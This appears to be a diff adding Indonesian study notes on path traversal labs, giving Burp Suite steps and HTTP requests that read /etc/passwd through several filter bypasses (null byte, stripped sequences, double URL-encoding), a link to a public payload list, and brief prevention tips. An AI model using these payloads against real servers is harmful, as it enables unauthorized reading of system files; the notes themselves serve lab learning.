@@ -1,0 +1,44 @@
+Simple Case 
+- On kan dulu burpsuite nya lalu pilih gambar yang mau di eksekusi 
+- Forward
+- Send To repeater 
+- pergi ke Repeater lalu edit filename jpg jadi etc/passwd 
+- cari sampai menemukan GET atau filename 
+- GET /image?filename=../../../etc/passwd HTTP/2 = (ketikkan di sini ../../../etc/passwd seperti di awal)
+    atau (GET /image?filename=/etc/passwd HTTP/)
+
+File path traversal, validation of file extension with null byte bypass
+- seperti biasa 
+- GET /image?filename=../../../../etc/passwd%00.jpg HTTP/2
+
+File path traversal, traversal sequences stripped non-recursively
+- seperti biasa 
+- buka gambar view details jangan lupa nyalakan dulu burpsuitenya 
+- lalu setelah itu pilih gambar yg lain nah nah open image in new tab 
+- lalu lihat nomor produknya bearapa pasang ke bs dan send jika mendapatkan gambar yg sama kemungknan vurnerable 
+- filtering ini dilakukan untuk memblok setiap kita mencari direktori di bagian URL jadi pertama akan d nlok oleh mereka 
+- GET /image?filename=//....//....//....//etc/passwd HTTP/2
+
+File path traversal, validation of start of path
+- seperti biasa 
+- GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
+
+File path traversal, traversal sequences stripped with superfluous URL-decode
+- seperti biasa 
+- GET /image?filename=..%252f..%252f..%252f/etc/passwd HTTP/2
+- gunanya untuk bypass 
+
+INTRUDER itu adalah alat untuk mengotomatisasi serangan khusus terhadap WEB APP ini snagat kuat dan dapat di konfigurasi
+
+PAYLOAD PATH TRAVERSAL 
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/deep_traversal.txt 
+
+
+Cara Pencegahannya 
+1.Kita harus memvalidasi input daris sisi developer 
+2. Pembatasan akses 
+3. Minimalisir Parameter 
+
+
+
+
